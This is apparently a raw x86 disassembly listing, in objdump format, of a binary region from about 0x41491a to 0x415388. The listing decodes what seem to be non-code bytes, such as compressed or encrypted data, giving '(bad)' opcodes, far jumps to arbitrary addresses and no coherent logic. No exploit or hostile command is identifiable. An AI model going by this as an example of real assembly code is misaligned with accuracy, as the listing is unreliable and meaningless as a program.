  41491a:	les    edi,FWORD PTR [edx+eiz*2+0x10]
  41491e:	fdivrp st(6),st
  414920:	outs   dx,BYTE PTR ds:[esi]
  414921:	push   eax
  414922:	test   al,0xba
  414924:	adc    BYTE PTR [eax],cl
  414926:	mov    dl,0xe9
  414928:	call   0x232c227a
  41492d:	push   cs
  41492e:	inc    ebx
  41492f:	sbb    bh,bh
  414931:	jge    0x4148f5
  414933:	add    BYTE PTR [ebx+0x33],dh
  414936:	cmp    DWORD PTR ds:[esi+0x35052111],esi
  41493d:	imul   esi,DWORD PTR [ecx],0xadfe595e
  414943:	mov    DWORD PTR [esi+ebp*2],ebx
  414946:	ret    
  414947:	and    eax,ebx
  414949:	mov    al,0xa8
  41494b:	aad    0x58
  41494d:	add    eax,DWORD PTR [ebp-0x72f13e17]
  414953:	xchg   DWORD PTR [eax+0x3582542c],esp
  414959:	sbb    ebp,ebp
  41495b:	loopne 0x414905
  41495d:	mov    edi,0x9bc65fdf
  414962:	je     0x41490b
  414964:	lods   al,BYTE PTR ds:[esi]
  414965:	push   ds
  414966:	arpl   WORD PTR [ebx+eax*4+0x35],bp
  41496a:	mov    al,0x4d
  41496c:	pop    edx
  41496d:	loopne 0x41496f
	...
  4149d3:	add    BYTE PTR [eax],al
  4149d5:	add    BYTE PTR [ebx],cl
  4149d7:	jle    0x4149ab
  4149d9:	and    esi,edi
  4149db:	scas   eax,DWORD PTR es:[edi]
  4149dc:	sti    
  4149dd:	jle    0x4149c5
  4149df:	pop    edx
  4149e0:	push   ds
  4149e1:	pop    es
  4149e2:	test   eax,0x6741b7db
  4149e7:	fiadd  WORD PTR [eax]
  4149e9:	add    BYTE PTR [eax],al
  4149eb:	add    DWORD PTR [eax],eax
  4149ed:	add    BYTE PTR [edi],bl
  4149ef:	lods   eax,DWORD PTR ds:[esi]
  4149f0:	shr    esp,cl
  4149f2:	push   edx
  4149f3:	lock dec ebx
  4149f5:	add    al,0xbc
  4149f7:	aad    0x48
  4149f9:	in     eax,0x61
  4149fb:	daa    
  4149fc:	sbb    eax,0x1bb3659
  414a01:	loope  0x4149e2
  414a03:	pop    ss
  414a04:	xor    eax,0xbca9184f
  414a09:	fdivr  st,st(6)
  414a0b:	shl    esp,1
  414a0d:	leave  
  414a0e:	dec    ecx
  414a0f:	cdq    
  414a10:	call   0x68e9:0x681d626d
  414a17:	xor    DWORD PTR [edi-0xb],ebp
  414a1a:	les    ebp,FWORD PTR es:[edi]
  414a1d:	jno    0x414a36
  414a1f:	add    al,0xa6
  414a21:	push   0x5e7354e0
  414a26:	inc    edi
  414a27:	into   
  414a28:	push   esp
  414a29:	or     eax,0xcdf35bdb
  414a2e:	dec    edi
  414a2f:	add    al,0x27
  414a31:	test   eax,esp
  414a33:	sub    al,0x61
  414a35:	push   0x50dac09e
  414a3a:	ret    0x11cb
  414a3d:	stos   DWORD PTR es:[edi],eax
  414a3e:	out    0x51,eax
  414a40:	lea    ebp,cs:[eax-0x2742399b]
  414a47:	adc    eax,0x85c31512
  414a4c:	or     ebp,eax
  414a4e:	aaa    
  414a4f:	(bad)  [ebx]
  414a51:	imul   ecx,eax,0x630b15c8
  414a57:	retf   
  414a58:	je     0x414a69
  414a5a:	push   eax
  414a5b:	cdq    
  414a5c:	mov    al,0x4a
  414a5e:	(bad)  
  414a5f:	fadd   st(5),st
  414a61:	pop    edi
  414a62:	mov    BYTE PTR [edi],ah
  414a64:	mov    edx,0xa870396f
  414a69:	mov    al,0x10
  414a6b:	or     eax,0x7550db
  414a70:	loop   0x414a9a
  414a72:	sbb    ah,dh
  414a74:	pop    esi
  414a75:	and    ah,cl
  414a77:	repnz xor ah,BYTE PTR [eax-0x1f]
  414a7b:	inc    esp
  414a7c:	dec    eax
  414a7d:	cmc    
  414a7e:	xlat   BYTE PTR ds:[ebx]
  414a7f:	clc    
  414a80:	cmp    eax,0x5a25e5a8
  414a85:	dec    esi
  414a86:	(bad)  
  414a87:	imul   edi,DWORD PTR [edi+0x55],0xe9093404
  414a8e:	add    eax,0x3de2319
  414a93:	inc    edx
  414a94:	and    DWORD PTR [edi+0x6],ecx
  414a97:	mov    edx,0x31e3a97e
  414a9c:	sbb    DWORD PTR [eax+ecx*8+0x12],esi
  414aa0:	add    edi,ecx
  414aa2:	stos   BYTE PTR es:[edi],al
  414aa3:	and    al,0xb3
  414aa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414aa6:	push   ebx
  414aa7:	leave  
  414aa8:	nop
  414aa9:	adc    DWORD PTR [esi+esi*4+0x67],edx
  414aad:	jle    0x414a93
  414aaf:	or     ebx,DWORD PTR [ecx-0x634e1ab]
  414ab5:	test   BYTE PTR [edx-0x6b],al
  414ab8:	add    DWORD PTR [esi],eax
  414aba:	push   edi
  414abb:	or     edi,DWORD PTR [eax-0x1b33b0ec]
  414ac1:	jno    0x414ab6
  414ac3:	adc    ebp,ebx
  414ac5:	das    
  414ac6:	cmp    DWORD PTR [eax+eiz*2+0x2a204339],ebx
  414acd:	dec    eax
  414ace:	fs inc esp
  414ad0:	call   0x9d332a25
  414ad5:	mov    esp,0xa6f6d197
  414ada:	pop    DWORD PTR [ecx+edi*4]
  414add:	inc    edi
  414ade:	ror    DWORD PTR [ebx],cl
  414ae0:	push   esi
  414ae1:	mov    bh,0x85
  414ae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ae4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ae5:	pop    ecx
  414ae6:	jno    0x414a71
  414ae8:	fld    TBYTE PTR [ebx+0x66]
  414aeb:	inc    esp
  414aec:	ret    
  414aed:	cmp    eax,DWORD PTR [eax]
	...
  414b53:	add    BYTE PTR [eax],al
  414b55:	add    BYTE PTR [edi+0x7e363ed9],bl
  414b5b:	neg    DWORD PTR [edi-0x265c9d07]
  414b61:	arpl   dx,sp
  414b63:	dec    ebx
  414b64:	not    DWORD PTR [ecx+0xdf67]
  414b6a:	add    BYTE PTR [ecx],al
  414b6c:	add    BYTE PTR [eax],al
  414b6e:	cdq    
  414b6f:	daa    
  414b70:	pushf  
  414b71:	inc    BYTE PTR [ecx+0x4c]
  414b74:	xchg   BYTE PTR [edi+0x2ab802df],cl
  414b7a:	test   DWORD PTR [edx+0x48],ebx
  414b7d:	or     al,0x5b
  414b7f:	clc    
  414b80:	loopne 0x414bd5
  414b82:	xchg   esi,eax
  414b83:	call   0xea209c72
  414b88:	ins    BYTE PTR es:[edi],dx
  414b89:	jbe    0x414b1c
  414b8b:	test   al,0xf2
  414b8d:	push   0x16
  414b8f:	es call 0x2f6:0xbce89423
  414b97:	push   esp
  414b98:	fbld   TBYTE PTR [esi]
  414b9a:	mov    ecx,0xf7b1a20f
  414b9f:	push   edi
  414ba0:	call   0x2ec1:0xbdc3fc12
  414ba7:	pushf  
  414ba8:	inc    esp
  414ba9:	xchg   ecx,ecx
  414bab:	fcmovu st,st(1)
  414bad:	scas   al,BYTE PTR es:[edi]
  414bae:	out    dx,eax
  414baf:	jp     0x414b53
  414bb1:	iret   
  414bb2:	xor    DWORD PTR [edi-0x25136306],edx
  414bb8:	mul    DWORD PTR [eax]
  414bba:	mov    bh,0xee
  414bbc:	nop
  414bbd:	dec    edi
  414bbe:	xchg   esi,eax
  414bbf:	mov    edi,0x252f3028
  414bc4:	or     DWORD PTR [edi+0x76],edi
  414bc7:	xor    edi,ebp
  414bc9:	dec    edi
  414bca:	iret   
  414bcb:	repz push eax
  414bcd:	mov    ecx,0xfe1e7e4d
  414bd2:	inc    ecx
  414bd3:	jb     0x414bdc
  414bd5:	jl     0x414be8
  414bd7:	dec    edi
  414bd8:	push   ecx
  414bd9:	push   0x56
  414bdb:	rcr    DWORD PTR [ebx-0x257136a0],1
  414be1:	ds sti 
  414be3:	jge    0x414c14
  414be5:	jg     0x414bd9
  414be7:	sbb    al,BYTE PTR [ebx-0x1402bbf1]
  414bed:	add    BYTE PTR [ebp+0x1e],0x23
  414bf1:	or     BYTE PTR [ebp-0x27],0x91
  414bf5:	push   esi
  414bf6:	dec    edi
  414bf7:	shl    DWORD PTR [eax-0x393e24c0],1
  414bfd:	lock mov ah,bh
  414c00:	fisttp QWORD PTR [ebp-0x24]
  414c03:	xor    BYTE PTR [ebx+0x6dc4f6bf],al
  414c09:	sti    
  414c0a:	fimul  DWORD PTR [edi+0x21]
  414c0d:	retf   0xa8bf
  414c10:	push   esi
  414c11:	jbe    0x414be3
  414c13:	stos   BYTE PTR es:[edi],al
  414c14:	imul   edi,DWORD PTR [ebp-0x452cbaf0],0xa44454be
  414c1e:	in     eax,0x71
  414c20:	rcr    DWORD PTR [ecx+0x55],cl
  414c23:	inc    edx
  414c24:	(bad)  
  414c25:	scas   eax,DWORD PTR es:[edi]
  414c26:	sbb    DWORD PTR [ecx-0x72],ebx
  414c29:	(bad)  
  414c2a:	cdq    
  414c2b:	push   eax
  414c2c:	test   DWORD PTR [edx+edi*4],0x1ccb4753
  414c33:	mov    esp,DWORD PTR [ecx-0x454618fd]
  414c39:	sub    al,0x59
  414c3b:	(bad)  
  414c3c:	mov    al,ds:0xe5f5efcd
  414c41:	loopne 0x414bdc
  414c43:	sti    
  414c44:	sbb    dl,bl
  414c46:	jnp    0x414c8a
  414c48:	push   esp
  414c49:	inc    esp
  414c4a:	(bad)  
  414c4b:	outs   dx,DWORD PTR ds:[esi]
  414c4c:	sub    ah,al
  414c4e:	mov    dh,0x5
  414c50:	je     0x414c39
  414c52:	pop    ecx
  414c53:	mov    ebp,0x3f0d6bc0
  414c58:	outs   dx,DWORD PTR ds:[esi]
  414c59:	cld    
  414c5a:	jae    0x414c44
  414c5c:	pop    ecx
  414c5d:	add    eax,0xaad64aaa
  414c62:	dec    ebx
  414c63:	mov    esp,?
  414c65:	dec    ebx
  414c66:	xchg   edx,eax
  414c67:	mov    BYTE PTR [edi],dh
  414c69:	adc    BYTE PTR [ecx],ch
  414c6b:	fxch   st(2)
  414c6d:	mov    ah,0x0
	...
  414cd3:	add    BYTE PTR [eax],al
  414cd5:	add    BYTE PTR [esp+eiz*2],dh
  414cd8:	push   ds
  414cd9:	jl     0x414d39
  414cdb:	jle    0x414d53
  414cdd:	ins    BYTE PTR es:[edi],dx
  414cde:	out    0x12,al
  414ce0:	adc    ecx,DWORD PTR cs:[eax+esi*4]
  414ce4:	mov    ecx,0xe0676c
  414ce9:	add    BYTE PTR [eax],al
  414ceb:	add    DWORD PTR [eax],eax
  414ced:	add    BYTE PTR [esi-0x76],bl
  414cf0:	push   ecx
  414cf1:	ret    
  414cf2:	adc    al,0xc
  414cf4:	xor    al,0xfe
  414cf6:	rcr    DWORD PTR [ecx+eiz*1-0x70],1
  414cfa:	lock mov al,0xb8
  414cfd:	mov    ecx,0x63c4edeb
  414d02:	inc    edx
  414d03:	jl     0x414cf3
  414d05:	jno    0x414cc8
  414d07:	jo     0x414d06
  414d09:	je     0x414c97
  414d0b:	pop    ds
  414d0c:	sub    DWORD PTR [esi+esi*2-0x33],edx
  414d10:	stos   BYTE PTR es:[edi],al
  414d11:	scas   eax,DWORD PTR es:[edi]
  414d12:	ins    DWORD PTR es:[edi],dx
  414d13:	adc    esp,edi
  414d15:	inc    edi
  414d16:	xor    eax,DWORD PTR [eax]
  414d18:	enter  0x3863,0x80
  414d1c:	iret   
  414d1d:	fdivr  QWORD PTR [esi+0x100e3341]
  414d23:	pop    eax
  414d24:	clc    
  414d25:	retf   
  414d26:	lods   eax,DWORD PTR fs:[esi]
  414d28:	(bad)  
  414d29:	in     eax,dx
  414d2a:	mov    dh,0x9a
  414d2c:	pusha  
  414d2d:	popa   
  414d2e:	loopne 0x414d5e
  414d30:	dec    esi
  414d31:	bound  ebx,QWORD PTR [eax+0x10]
  414d34:	std    
  414d35:	jmp    0x7d66:0x55972ec8
  414d3c:	cmp    eax,ecx
  414d3e:	inc    esi
  414d3f:	es popf 
  414d41:	loop   0x414d0e
  414d43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d44:	add    bh,ah
  414d46:	sbb    eax,0x1c754016
  414d4b:	ds data16 stc 
  414d4e:	pop    ebp
  414d4f:	sbb    BYTE PTR [ecx],cl
  414d51:	test   DWORD PTR [ebx+ebx*2],0x2995da68
  414d58:	jl     0x414d23
  414d5a:	in     eax,dx
  414d5b:	loope  0x414ce3
  414d5d:	mov    ch,0x22
  414d5f:	xchg   DWORD PTR [eax+0x5d727d34],ebx
  414d65:	shl    DWORD PTR [edi+0x32],cl
  414d68:	stos   DWORD PTR es:[edi],eax
  414d69:	(bad)  
  414d6a:	jno    0x414dc6
  414d6c:	in     al,0xbc
  414d6e:	in     al,dx
  414d6f:	cmc    
  414d70:	mov    bl,0x5f
  414d72:	xchg   ecx,eax
  414d73:	dec    esp
  414d74:	je     0x414d19
  414d76:	add    ecx,DWORD PTR [ebp+0x1e2e030]
  414d7c:	and    BYTE PTR [edi],ch
  414d7e:	fstp   QWORD PTR [edx-0x40a33472]
  414d84:	stos   BYTE PTR es:[edi],al
  414d85:	and    edx,ecx
  414d87:	and    eax,0x42f7ad41
  414d8c:	out    dx,eax
  414d8d:	add    eax,0x72c43137
  414d92:	daa    
  414d93:	cs jno 0x414dfd
  414d96:	push   ebx
  414d97:	lock jg 0x414d81
  414d9a:	xor    ebx,esi
  414d9c:	ds (bad) 
  414d9e:	mov    bl,0x3e
  414da0:	mov    edx,0xf9889d21
  414da5:	call   FWORD PTR [eax]
  414da7:	pop    ebx
  414da8:	sub    esp,DWORD PTR [eax+0xa2f3d9e]
  414dae:	iret   
  414daf:	ret    
  414db0:	dec    edx
  414db1:	arpl   WORD PTR [edx],dx
  414db3:	jnp    0x414da1
  414db5:	test   edx,0x2f905798
  414dbb:	mov    al,0x81
  414dbd:	neg    bl
  414dbf:	sub    al,0x32
  414dc1:	jg     0x414e29
  414dc3:	mov    cl,0xa1
  414dc5:	inc    esp
  414dc6:	lods   eax,DWORD PTR ds:[esi]
  414dc7:	test   al,0x73
  414dc9:	daa    
  414dca:	addr16 call 0xfd05:0xb97e7697
  414dd2:	ret    0x67b1
  414dd5:	sub    eax,0x758cdaaa
  414dda:	sbb    al,BYTE PTR [ecx]
  414ddc:	rcr    DWORD PTR [ecx-0x7f221756],1
  414de2:	sub    eax,0x8234d3ad
  414de7:	jmp    0x30ba70b6
  414dec:	sub    al,0x88
	...
  414e56:	mov    bh,0x99
  414e58:	adc    dl,BYTE PTR [ecx-0x404864c2]
  414e5e:	in     al,dx
  414e5f:	xor    dh,BYTE PTR [esi]
  414e61:	adc    eax,0x59dbc6d8
  414e66:	addr16 loope 0x414e69
  414e69:	add    BYTE PTR [eax],al
  414e6b:	add    DWORD PTR [eax],eax
  414e6d:	add    BYTE PTR [esi-0x3fb8d76d],al
  414e73:	cwde   
  414e74:	dec    edx
  414e75:	push   esp
  414e76:	in     eax,0xd6
  414e78:	retf   0xc200
  414e7b:	les    edi,FWORD PTR [esi]
  414e7d:	nop
  414e7e:	add    BYTE PTR [ebx+0x63],0x3f
  414e82:	scas   eax,DWORD PTR es:[edi]
  414e83:	aam    0x9c
  414e85:	dec    ecx
  414e86:	call   0xf687c9ba
  414e8b:	es jmp 0xc0d6:0x1e4c1ccd
  414e93:	add    ebx,DWORD PTR [ebx+0x3532c5c3]
  414e99:	mov    ecx,0x7f3e6ea4
  414e9e:	mov    WORD PTR [edx-0x64],fs
  414ea1:	add    ebx,DWORD PTR [edx+0x47d76633]
  414ea7:	pop    edx
  414ea8:	xchg   ecx,eax
  414ea9:	or     al,0x36
  414eab:	and    ch,BYTE PTR [ebx]
  414ead:	test   al,0x29
  414eaf:	push   esp
  414eb0:	inc    ebx
  414eb1:	jl     0x414ef9
  414eb3:	es mov dh,0x8d
  414eb6:	and    BYTE PTR [ebx-0x6d],al
  414eb9:	xchg   edx,eax
  414eba:	mov    ebp,0x9244603a
  414ebf:	adc    DWORD PTR [edx],0xb51db851
  414ec5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ec6:	jle    0x414f22
  414ec8:	test   BYTE PTR [edx+ebx*2+0x58],ch
  414ecc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ecd:	mov    bl,0x3f
  414ecf:	rcr    ecx,cl
  414ed1:	mov    cl,0x30
  414ed3:	gs push es
  414ed5:	push   edx
  414ed6:	cmp    ch,BYTE PTR [edi]
  414ed8:	enter  0xbb5e,0xab
  414edc:	mov    ecx,0x8d4c62e0
  414ee1:	(bad)
  414ee4:	fldenv [eax+0x71]
  414ee7:	std    
  414ee8:	mov    ebx,0xcf03b7cb
  414eed:	scas   eax,DWORD PTR es:[edi]
  414eee:	and    dh,bh
  414ef0:	jg     0x414eaf
  414ef2:	jl     0x414f03
  414ef4:	sub    esi,DWORD PTR [edi-0x30]
  414ef7:	jp     0x414f20
  414ef9:	mov    DWORD PTR [ecx-0x58],ebp
  414efc:	sub    esi,DWORD PTR [edx-0xa51b173]
  414f02:	ja     0x414f06
  414f04:	call   0x4478:0x6465166e
  414f0b:	sub    al,0x24
  414f0d:	std    
  414f0e:	call   0xce81:0x2138167a
  414f15:	adc    ebp,DWORD PTR [ecx-0x2e03c0]
  414f1b:	push   0xb9ae80f0
  414f20:	stc    
  414f21:	sbb    ebx,DWORD PTR [eax]
  414f23:	push   0xa12764d2
  414f28:	mov    ecx,0x44bd48bb
  414f2d:	adc    ebx,DWORD PTR [esi-0x4a]
  414f30:	xchg   ecx,eax
  414f31:	jne    0x414f0e
  414f33:	scas   al,BYTE PTR es:[edi]
  414f34:	inc    esp
  414f35:	adc    dl,ch
  414f37:	retf   0xc5a1
  414f3a:	test   DWORD PTR [edi-0x1b7cef47],ecx
  414f40:	ret    
  414f41:	pop    ebp
  414f42:	mov    esp,DWORD PTR [esp+edi*2]
  414f45:	push   cs
  414f46:	jmp    0x414faf
  414f48:	mov    esp,0x819d57d3
  414f4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f4e:	mov    ?,ebx
  414f50:	mov    bl,0x44
  414f52:	push   ebp
  414f53:	jg     0x414ef5
  414f55:	int    0x6f
  414f57:	repnz lods eax,DWORD PTR ds:[esi]
  414f59:	xchg   al,dl
  414f5b:	dec    ebx
  414f5c:	and    BYTE PTR [eax-0x8],cl
  414f5f:	stos   DWORD PTR es:[edi],eax
  414f60:	ror    BYTE PTR [ebp+edi*1-0x59],1
  414f64:	push   ecx
  414f65:	loope  0x414f00
  414f67:	in     al,dx
  414f68:	fistp  WORD PTR [edx]
  414f6a:	push   esi
  414f6b:	xlat   BYTE PTR ds:[ebx]
  414f6c:	xchg   ebp,eax
  414f6d:	add    eax,DWORD PTR [eax]
	...
  414fd3:	add    BYTE PTR [eax],al
  414fd5:	add    BYTE PTR [edi],dh
  414fd7:	data16 xor al,0x9b
  414fda:	jne    0x414fb7
  414fdc:	mov    edi,0xe45ae5ee
  414fe1:	call   0xe267:0x5db18a51
  414fe8:	add    BYTE PTR [eax],al
  414fea:	add    BYTE PTR [ecx],al
  414fec:	add    BYTE PTR [eax],al
  414fee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fef:	shl    ebp,1
  414ff1:	repz mov al,0x5c
  414ff4:	and    BYTE PTR [edi],dl
  414ff6:	mov    ds:0xe0041c52,al
  414ffb:	sar    edx,0x1d
  414ffe:	mov    ebp,0x60bce546
  415003:	sub    dh,dh
  415005:	push   ebx
  415006:	push   ebp
  415007:	dec    eax
  415008:	adc    BYTE PTR [esi-0x1bcdd526],bh
  41500e:	data16 fcomp DWORD PTR [ebx]
  415011:	mov    ah,0x31
  415013:	lods   eax,DWORD PTR ds:[esi]
  415014:	and    BYTE PTR [ebx-0x2be945b3],al
  41501a:	mov    ebx,0xf81dea6
  41501f:	sar    ebx,0x3b
  415022:	dec    eax
  415023:	cmp    DWORD PTR [ebp+0x74fb63c8],edx
  415029:	sub    bh,BYTE PTR [edi]
  41502b:	xor    al,0x92
  41502d:	cmp    BYTE PTR [edi-0x7c],cl
  415030:	aam    0xd6
  415032:	mov    ebx,0xae497bca
  415037:	push   cs
  415038:	xlat   BYTE PTR ds:[ebx]
  415039:	mov    ebx,0xb7d43db3
  41503e:	shr    DWORD PTR [ebx],1
  415040:	jno    0x415075
  415042:	or     al,0xe5
  415044:	(bad)  
  415045:	repz je 0x4150b8
  415048:	(bad)  
  415049:	mov    edi,0x63e8be0e
  41504e:	dec    ebx
  41504f:	mov    ah,0xb5
  415051:	xchg   edx,eax
  415052:	shl    DWORD PTR [esp+edi*2],cl
  415055:	loope  0x41508b
  415057:	stos   DWORD PTR es:[edi],eax
  415058:	jmp    0x8fc4:0x51f4ba4e
  41505f:	dec    ebx
  415060:	(bad)  
  415061:	in     eax,0x7b
  415063:	call   0x2b10:0x9184f673
  41506a:	std    
  41506b:	jno    0x415017
  41506d:	jmp    0x414ffd
  41506f:	pop    ebx
  415070:	jns    0x4150ef
  415072:	jmp    0x8db0:0x91d4de55
  415079:	pop    esp
  41507a:	sahf   
  41507b:	repnz xor BYTE PTR [ebx],0x1c
  41507f:	shr    ebx,1
  415081:	xchg   DWORD PTR [edx],edx
  415083:	mov    eax,ds:0x981161e7
  415088:	mov    BYTE PTR [edi+0x52],dl
  41508b:	sbb    edi,DWORD PTR ds:0xd2a354b4
  415091:	push   ss
  415092:	test   eax,0x20d29fbe
  415097:	sub    al,0x35
  415099:	out    dx,eax
  41509a:	addr16 repnz nop
  41509d:	enter  0x74be,0x64
  4150a1:	xchg   edx,eax
  4150a2:	add    dh,BYTE PTR ds:0xa0722915
  4150a8:	js     0x41502d
  4150aa:	repz mov edx,0xeaf62e5d
  4150b0:	jbe    0x4150cb
  4150b2:	push   ecx
  4150b3:	or     bh,dl
  4150b5:	push   edi
  4150b6:	test   eax,0x3fb323c5
  4150bb:	dec    eax
  4150bc:	push   edi
  4150bd:	ins    DWORD PTR es:[edi],dx
  4150be:	xchg   esp,eax
  4150bf:	sti    
  4150c0:	int    0x76
  4150c2:	ins    BYTE PTR es:[edi],dx
  4150c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150c4:	cmp    al,0xe2
  4150c6:	fwait
  4150c7:	lds    ebp,FWORD PTR [ebx+0x3c]
  4150ca:	ins    DWORD PTR es:[edi],dx
  4150cb:	gs out 0xb6,eax
  4150ce:	repz inc ebx
  4150d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150d1:	pop    edx
  4150d2:	pusha  
  4150d3:	mov    ds:0xfe7e191d,eax
  4150d8:	je     0x415103
  4150da:	sub    ebx,DWORD PTR [ecx-0x316f582e]
  4150e0:	cld    
  4150e1:	jns    0x415136
  4150e3:	sti    
  4150e4:	dec    ecx
  4150e5:	push   es
  4150e6:	pop    edi
  4150e7:	ficomp WORD PTR [ebp-0x244ae1a9]
  4150ed:	xor    al,0x0
	...
  415153:	add    BYTE PTR [eax],al
  415155:	add    BYTE PTR [ebx+0x2],bh
  415158:	add    ebp,ebx
  41515a:	jnp    0x415147
  41515c:	sti    
  41515d:	xchg   edx,eax
  41515e:	lahf   
  41515f:	mov    esi,0x82f1fc2d
  415164:	in     al,dx
  415165:	xchg   BYTE PTR [edi-0x1d],ah
  415168:	add    BYTE PTR [eax],al
  41516a:	add    BYTE PTR [ecx],al
  41516c:	add    BYTE PTR [eax],al
  41516e:	dec    ebx
  41516f:	fstp   QWORD PTR [ebp+0x27]
  415172:	aad    0x62
  415174:	ins    BYTE PTR es:[edi],dx
  415175:	frstor [ebx]
  415177:	fbstp  TBYTE PTR [ebx-0x6f]
  41517a:	(bad)  
  41517b:	ss rcl dx,0x34
  415180:	xor    BYTE PTR [esp+eax*8],cl
  415183:	add    DWORD PTR [esi-0x65],esp
  415186:	adc    DWORD PTR [esp+edi*8],ebx
  415189:	mov    esp,DWORD PTR [ebx+0x5732cb57]
  41518f:	call   0x5c04:0xbdba9799
  415196:	sub    ah,BYTE PTR [edi+0x371e11d3]
  41519c:	sbb    bh,BYTE PTR [eax]
  41519e:	std    
  41519f:	repnz int3 
  4151a1:	sub    al,0x82
  4151a3:	mov    ebp,0x2d7168f4
  4151a8:	pop    eax
  4151a9:	push   ebx
  4151aa:	add    DWORD PTR [edx],0xf4fc170
  4151b0:	stos   BYTE PTR es:[edi],al
  4151b1:	inc    ebx
  4151b2:	call   0xe830:0x2983ddb1
  4151b9:	lock rol BYTE PTR [edx],1
  4151bc:	shl    BYTE PTR [edx-0x6cb6659c],0xe0
  4151c3:	neg    bl
  4151c5:	sbb    DWORD PTR [ecx+0x330458ac],edx
  4151cb:	jge    0x41519c
  4151cd:	push   ebp
  4151ce:	xor    dl,BYTE PTR fs:[ecx]
  4151d1:	pop    es
  4151d2:	js     0x415184
  4151d4:	clc    
  4151d5:	jb     0x4151d2
  4151d7:	push   ebp
  4151d8:	add    DWORD PTR [ebx],ecx
  4151da:	lea    ebx,[esi+ecx*8+0x364f55bc]
  4151e1:	inc    esp
  4151e2:	je     0x415231
  4151e4:	pop    ebx
  4151e5:	pop    edx
  4151e6:	inc    ecx
  4151e7:	pop    esi
  4151e8:	bound  esi,QWORD PTR [esi]
  4151ea:	test   esi,ecx
  4151ec:	pusha  
  4151ed:	jl     0x415257
  4151ef:	jb     0x4151f8
  4151f1:	sbb    DWORD PTR [ecx],edi
  4151f3:	push   ss
  4151f4:	test   al,0xec
  4151f6:	scas   eax,DWORD PTR es:[edi]
  4151f7:	and    DWORD PTR [ecx-0x72ff4c23],esi
  4151fd:	sbb    al,0x95
  4151ff:	cmp    BYTE PTR [edi],bh
  415201:	cmp    ch,ch
  415203:	push   esi
  415204:	sbb    DWORD PTR [esi+0x6051fc5a],esi
  41520a:	xor    al,0xb9
  41520c:	ins    BYTE PTR es:[edi],dx
  41520d:	rol    DWORD PTR [edx+ebp*4],1
  415210:	ret    
  415211:	pop    esi
  415212:	dec    edi
  415213:	idiv   DWORD PTR [esi-0x6e7fad4]
  415219:	or     eax,0xe4db3edf
  41521e:	pop    es
  41521f:	jnp    0x41524c
  415221:	push   esi
  415222:	jecxz  0x4151af
  415224:	das    
  415225:	dec    ebp
  415226:	loope  0x4151fb
  415228:	sub    dh,BYTE PTR [eax+0x46]
  41522b:	data16 or al,0xa6
  41522e:	adc    dl,BYTE PTR [eax-0x70]
  415231:	inc    edx
  415232:	shl    BYTE PTR [ebx+0x68],0x24
  415236:	cmp    esp,esi
  415238:	dec    edx
  415239:	mov    dh,0x7e
  41523b:	pop    es
  41523c:	sub    eax,0xd51d67cb
  415241:	push   ebp
  415242:	stos   BYTE PTR es:[edi],al
  415243:	cld    
  415244:	xchg   esi,eax
  415245:	jmp    0x415258
  415247:	shl    DWORD PTR [ecx],cl
  415249:	adc    al,0x9b
  41524b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41524c:	and    esi,esi
  41524e:	mov    ds:0xaa32f48f,al
  415253:	outs   dx,DWORD PTR ds:[esi]
  415254:	dec    esi
  415255:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415257:	and    BYTE PTR [ecx+0x61fbd281],ch
  41525d:	ins    BYTE PTR es:[edi],dx
  41525e:	jge    0x4152c1
  415260:	pop    edi
  415261:	jl     0x415243
  415263:	jge    0x4152e1
  415265:	stos   DWORD PTR es:[edi],eax
  415266:	pop    ds
  415267:	addr16 test eax,0x83f9271c
  41526d:	and    DWORD PTR [eax],eax
	...
  4152d3:	add    BYTE PTR [eax],al
  4152d5:	add    BYTE PTR [edi+edx*4],ch
  4152d8:	pop    ds
  4152d9:	sar    DWORD PTR [edi-0x6001127],1
  4152df:	(bad)  
  4152e0:	mov    ecx,0x4b95570b
  4152e5:	in     eax,0x67
  4152e7:	in     al,0x0
  4152e9:	add    BYTE PTR [eax],al
  4152eb:	add    DWORD PTR [eax],eax
  4152ed:	add    cl,ah
  4152ef:	ret    0x53ab
  4152f2:	pushf  
  4152f3:	xor    DWORD PTR [ebx*4-0x331a6d8c],edi
  4152fa:	ret    
  4152fb:	sbb    al,ch
  4152fd:	or     al,0x44
  4152ff:	mov    ebx,0x1e7249df
  415304:	daa    
  415305:	adc    al,0x97
  415307:	mov    es,WORD PTR [ebp+0x2f50c738]
  41530d:	sti    
  41530e:	fs inc eax
  415310:	push   0xd0267bae
  415315:	stc    
  415316:	mov    BYTE PTR [ebx+0x597d09dc],bl
  41531c:	sub    eax,0x9790cd2a
  415321:	lahf   
  415322:	sbb    BYTE PTR [ebx-0x5a863d20],cl
  415328:	adc    BYTE PTR [ebx+0x3faf4371],dh
  41532e:	mov    al,ds:0x977fd3d3
  415333:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  415335:	imul   esp,edx,0x108f91e6
  41533b:	nop
  41533c:	or     edx,ecx
  41533e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41533f:	test   BYTE PTR [eax+esi*1],ch
  415342:	test   BYTE PTR [eax+ebx*1],dh
  415345:	les    ecx,FWORD PTR [eax-0x60]
  415348:	out    dx,al
  415349:	imul   eax,DWORD PTR [esi-0x572ec709],0x3a9414bc
  415353:	push   ds
  415354:	add    edi,DWORD PTR [eax+0x7b6a899e]
  41535a:	sub    al,0x44
  41535c:	jns    0x415351
  41535e:	shl    BYTE PTR [esi+0x7a],0xc9
  415362:	mov    ah,0x18
  415364:	(bad)  
  415365:	push   0x7c9ad684
  41536a:	cmp    eax,0xb3e12b6c
  41536f:	cmp    eax,0xb646d1aa
  415374:	mov    eax,ds:0x98c5390
  415379:	push   eax
  41537a:	addr16 and al,0x20
  41537d:	or     ah,ah
  41537f:	xchg   esi,eax
  415380:	and    eax,0xd3c771c9
  415385:	pop    ebp
  415386:	leave  
  415387:	(bad)  
  415388:	loop   0x415366
